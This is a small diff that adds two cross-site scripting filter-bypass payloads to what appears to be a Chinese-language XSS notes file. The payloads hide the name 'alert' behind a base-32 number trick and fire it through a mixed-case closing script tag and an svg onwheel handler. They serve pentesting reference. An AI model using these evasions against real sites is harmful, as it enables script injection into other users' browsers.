@@ -262,5 +262,9 @@ XSSfuzz生成器:https://github.com/NytroRST/XSSFuzzer/blob/master/fuzzer.html
 
 
 
+绕 alert
 
-
+```html
+top[11189117..toString(32)](1);
+</sCrIpT><svg  onwheel=top[11189117..toString(32)](1);>
+```
